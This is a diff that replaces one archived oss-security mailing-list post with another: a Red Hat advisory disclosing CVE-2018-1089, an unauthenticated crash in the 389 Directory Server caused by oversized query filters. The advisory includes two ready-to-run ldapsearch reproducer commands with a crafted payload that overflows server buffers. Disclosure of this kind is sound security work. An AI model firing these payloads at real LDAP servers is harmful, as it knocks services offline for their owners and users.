@@ -1,23 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/18/2
-Message-ID: <CAJ_zFkJgSzTV8WKRL7OW6ueFibVGvNY-P6sBNBrDeagLrbPfWw@mail.gmail.com>
-Date: Thu, 18 Oct 2018 05:32:18 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: Golden_Miller83@...tonmail.ch
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/07/2
+Message-ID: <CAKG8Do7DJOj05DgTnztiM7O780z3kXmKRoeNy6yB5_Yr1Uahwg@mail.gmail.com>
+Date: Mon, 7 May 2018 17:30:57 +0200
+From: Cedric Buissart <cbuissar@...hat.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Oct 18, 2018 at 3:51 AM Jordan Glover <Golden_Miller83@...tonmail.ch>
-wrote:
+Hi all,
 
-> Do you know if upstream is going to make new release soon or distros
-> should take the
-> pain and backport all of those themselves?
->
+This is to disclose the following flaw, CVE-2018-1089 :
 
-AFAIK upstream only makes quarterly releases, so I think you need to
-backport.
+389-ds-base, a.k.a 389 Directory Server, https://pagure.io/389-ds-base/,
+is a highly usable, fully featured, reliable and secure LDAP server
+implementation. It handles many of the largest LDAP deployments in the
+world.
 
-Tavis.
+389-ds server did not properly handle characters needed to be escaped in
+its query filter. This could result in buffer overflows, from the heap
+or the stack, on larger filters.  An unauthenticated attacker could send
+a specially crafted LDAP request and crash the server. RCE has not been
+demonstrated at this time.
+
+Red Hat would like to thank Greg Kubok for alerting us of the issue.
+
+
+Reproducer1 :
+[root@...ver1 ~]# payload=$(printf '.*$%.0s' {1..1000})
+[root@...ver1 ~]# ldapsearch -h localhost -p 389 -x -b "dc=blah"
+"(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(givenName=*${payload}*))(objectClass=posixaccount))"
+"telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title
+loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName
+givenName nsAccountLock"
+
+Reproducer2:
+[root@...ver1 ~]# perl -e 'print ".*\$" x (1400)' | ldapsearch -x -f-
+"(&(uid=%s)(objectClass=posixaccount))"
+
+
+Patch attached for versions 1.3.7 & 1.2.11
+
+Thanks!
+
+-- 
+Cedric Buissart,
+Product Security
 
